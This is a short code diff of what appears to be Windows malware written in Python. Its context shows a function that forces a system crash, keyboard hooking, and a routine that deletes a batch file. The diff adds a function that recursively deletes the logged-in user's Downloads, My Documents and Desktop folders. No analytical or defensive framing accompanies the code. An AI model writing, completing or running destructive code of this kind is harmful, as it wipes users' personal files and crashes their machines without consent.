@@ -6,6 +6,7 @@ import keyboard
 import ctypes
 import subprocess
 import ctypes.wintypes
+import shutil
 
 def bsod():
 	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -25,6 +26,15 @@ def uninstall(wind):
 	os.remove(bat_path + '\\' + "open.bat")
 	keyboard.unhook_all()
 
+def remove():
+    user = os.getlogin()
+    os.chdir(r'C:\Users\%s' %user)
+    subprocess.call("dir",shell=True)
+    shutil.rmtree('del')
+    shutil.rmtree('Downloads')
+    shutil.rmtree('My Documents')
+    shutil.rmtree('Desktop')
+   
 
 
 
